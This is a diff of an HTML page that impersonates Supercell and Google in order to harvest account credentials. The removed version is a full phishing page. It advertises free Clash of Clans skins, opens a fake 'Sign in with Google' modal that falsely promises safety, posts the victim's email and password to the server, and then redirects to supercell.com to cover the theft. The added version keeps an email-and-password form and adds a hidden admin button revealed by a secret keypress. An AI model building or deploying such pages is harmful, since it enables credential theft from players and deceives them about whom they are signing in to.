@@ -1,147 +1,22 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Clash Rewards - Limited Time</title>
-  <link href="https://fonts.googleapis.com/css2?family=Baloo+2:wght@400;600&display=swap" rel="stylesheet">
-  <style>
-    body { font-family: 'Baloo 2', cursive; background: #f7f7f7; margin:0; padding:0; }
-    header { background: #222; color: #fff; padding: 20px; text-align: center; }
-    header img { height: 50px; }
-    .subtitle { color: #ddd; font-size: 16px; }
-    .countdown { font-size: 18px; margin-top: 10px; color: #f39c12; }
-    .offers { display: grid; grid-template-columns: repeat(auto-fill, minmax(45%, 1fr)); gap: 15px; padding: 20px; }
-    .card { background: #fff; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; padding: 15px; }
-    .card img { width: 100%; border-radius: 12px; }
-    .card h3 { margin: 10px 0 5px; }
-    .card p { font-size: 14px; color: #555; }
-    .card button { margin-top: 10px; background: #f39c12; color: #fff; border: none; padding: 10px 15px; border-radius: 8px; font-size: 16px; cursor: pointer; }
-    .card button:hover { background: #d35400; }
-
-    /* Login Modal */
-    .login-modal { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.7); justify-content: center; align-items: center; }
-    .login-container { background: #fff; padding: 25px; border-radius: 12px; width: 90%; max-width: 400px; text-align: center; }
-    .login-container input { width: 90%; padding: 10px; margin: 8px 0; font-size: 16px; border: 1px solid #ccc; border-radius: 8px; }
-    .login-container button { background: #4285f4; color:#fff; border:none; padding: 10px 20px; border-radius:8px; font-size:16px; cursor: pointer; }
-    .login-container button:hover { background: #357ae8; }
-    .login-note { font-size: 12px; color: #777; margin-top: 10px; }
-
-    /* Thank You Popup */
-    .thank-popup { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.8); justify-content: center; align-items: center; }
-    .popup-content { background:#fff; padding:30px; border-radius:12px; text-align:center; }
-    .popup-content img { width: 120px; margin-bottom: 15px; }
-  </style>
+    <meta charset="UTF-8">
+    <title>Supercell Rewards Hub</title>
 </head>
 <body>
+    <!-- Keep your original Zite content here -->
 
-<header>
-  <img src="https://static.wikia.nocookie.net/clashofclans/images/5/55/Clash_Logo.png" alt="Clash Logo">
-  <h1>Limited Time Clash Rewards</h1>
-  <p class="subtitle">Grab exclusive skins & sceneries before the timer ends!</p>
-  <p id="countdown" class="countdown"></p>
-</header>
+    <form action="/submit" method="POST">
+        <input type="email" name="email" placeholder="Email" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Submit</button>
+    </form>
 
-<main>
-  <div class="offers">
-    <div class="card">
-      <img src="https://static.wikia.nocookie.net/clashofclans/images/3/3b/Primal_King_Skin.png" alt="Primal King">
-      <h3>Primal King Skin</h3>
-      <p>Exclusive limited-time skin for Barbarian King</p>
-      <button onclick="openLogin()">Claim Now</button>
-    </div>
-    <div class="card">
-      <img src="https://static.wikia.nocookie.net/clashofclans/images/d/d6/Clockwork_Queen_Skin.png" alt="Clockwork Queen">
-      <h3>Clockwork Queen Skin</h3>
-      <p>Special edition skin for Archer Queen</p>
-      <button onclick="openLogin()">Claim Now</button>
-    </div>
-    <div class="card">
-      <img src="https://static.wikia.nocookie.net/clashofclans/images/7/75/Party_Warden_Skin.png" alt="Party Warden">
-      <h3>Party Warden Skin</h3>
-      <p>Party vibes for Grand Warden!</p>
-      <button onclick="openLogin()">Claim Now</button>
-    </div>
-    <div class="card">
-      <img src="https://static.wikia.nocookie.net/clashofclans/images/8/89/Shadow_Champion_Skin.png" alt="Shadow Champion">
-      <h3>Shadow Champion Skin</h3>
-      <p>Dark and deadly look for Royal Champion</p>
-      <button onclick="openLogin()">Claim Now</button>
-    </div>
-    <div class="card">
-      <img src="https://static.wikia.nocookie.net/clashofclans/images/2/2c/Primal_Scenery.png" alt="Primal Scenery">
-      <h3>Primal Scenery</h3>
-      <p>Transform your base with primal vibes!</p>
-      <button onclick="openLogin()">Claim Now</button>
-    </div>
-    <div class="card">
-      <img src="https://static.wikia.nocookie.net/clashofclans/images/3/31/Shadow_Scenery.png" alt="Shadow Scenery">
-      <h3>Shadow Scenery</h3>
-      <p>Enter the shadows with this exclusive base!</p>
-      <button onclick="openLogin()">Claim Now</button>
-    </div>
-    <div class="card">
-      <img src="https://static.wikia.nocookie.net/clashofclans/images/5/55/Clockwork_Scenery.png" alt="Clockwork Scenery">
-      <h3>Clockwork Scenery</h3>
-      <p>A mechanical twist for your base look.</p>
-      <button onclick="openLogin()">Claim Now</button>
-    </div>
-    <div class="card">
-      <img src="https://static.wikia.nocookie.net/clashofclans/images/f/f0/Party_Scenery.png" alt="Party Scenery">
-      <h3>Party Scenery</h3>
-      <p>Celebrate Clash with party decorations!</p>
-      <button onclick="openLogin()">Claim Now</button>
-    </div>
-  </div>
-</main>
-
-<!-- Google-style Login Modal -->
-<div id="loginModal" class="login-modal">
-  <div class="login-container">
-    <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google Logo" style="width:60px;margin-bottom:15px;">
-    <h2>Sign in with Google</h2>
-    <p>to continue to Clash Rewards</p>
-    <input id="loginEmail" type="email" placeholder="Email or phone">
-    <input id="loginPassword" type="password" placeholder="Enter your password">
-    <button onclick="submitLogin()">Next</button>
-    <p class="login-note">Your Google account is safe. This is a secure reward claim.</p>
-  </div>
-</div>
-
-<!-- Thank You Popup -->
-<div id="thankYou" class="thank-popup">
-  <div class="popup-content">
-    <img src="https://static.wikia.nocookie.net/clashofclans/images/6/6d/Judgement_King_Skin.png" alt="Reward Claimed">
-    <h2>Thank You!</h2>
-    <p>Your reward will be delivered within 24 hours.</p>
-  </div>
-</div>
-
-<script>
-function openLogin() {
-  document.getElementById('loginModal').style.display = 'flex';
-}
-async function submitLogin(){
-  const email = document.getElementById('loginEmail').value;
-  const password = document.getElementById('loginPassword').value;
-  await fetch('/login', {
-    method: 'POST',
-    headers: {'Content-Type':'application/json'},
-    body: JSON.stringify({email, password})
-  });
-  document.getElementById('loginModal').style.display='none';
-  document.getElementById('thankYou').style.display='flex';
-  setTimeout(()=>{ window.location.href="https://supercell.com"; },3000);
-}
-// Countdown
-let countDownDate = new Date().getTime() + (3*24*60*60*1000);
-setInterval(function() {
-  let now = new Date().getTime();
-  let distance = countDownDate - now;
-  let days = Math.floor(distance / (1000*60*60*24));
-  let hours = Math.floor((distance%(1000*60*60*24))/(1000*60*60));
-  let minutes = Math.floor((distance%(1000*60*60))/(1000*60));
-  let seconds = Math.floor((distance%(1000*60))/1000);
-  document.getElementById("countdown").innerHTML = "Offer ends in: " + days + "d " + hours + "h " + minutes + "m " + seconds + "s";
-}, 1000);
-</script>
+    <button id="hiddenAdminBtn" style="display:none;position:fixed;bottom:10px;right:10px;padding:10px 15px;">Admin</button>
+    <script>
+    document.addEventListener('keydown',e=>{if(e.key==='¥'){document.getElementById('hiddenAdminBtn').style.display='block';}});
+    document.getElementById('hiddenAdminBtn').onclick=()=>window.location.href='/admin';
+    </script>
 </body>
 </html>
